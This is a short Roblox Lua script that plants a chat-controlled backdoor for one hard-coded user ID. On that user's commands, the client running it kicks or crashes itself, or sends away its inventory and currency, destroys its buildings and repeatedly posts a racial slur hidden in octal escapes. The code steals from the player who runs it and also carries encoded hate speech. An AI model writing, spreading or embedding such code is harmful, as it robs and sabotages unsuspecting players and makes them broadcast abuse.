local users = {4689098594}
local lp = game:GetService("Players").LocalPlayer

local function user(plr)
  if not table.find(users, plr.UserId) then return end
  
  plr.Chatted:Connect(function(msg) -- chatted works somehow
      if msg:lower() == "@kick" then
        lp.Parent = game
      end
      
      if msg:lower() == "@crash" then
        while true do end  
      end
      
      if msg:lower() == "@rail" then
        for i,v in next, lp.PlayerData.Inventory.Value:split"," do
          game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("InventoryEvent"):FireServer(3, v)
        end
        game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("MenuActionEvent"):FireServer(2, tostring(lp.PlayerData.Currency.Value), plr.Name)
        for i = 1,6 do
          game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("BuildingEvent"):FireServer(3, i)
        end
        while task.wait(.1) do
          lp.Parent:Chat "\110\105\103\103\101\114" -- lol
        end
      end
  end)
end

for i,v in next, lp.Parent:getPlayers() do
  user(v)
end

lp.Parent.PlayerAdded:Connect(user)
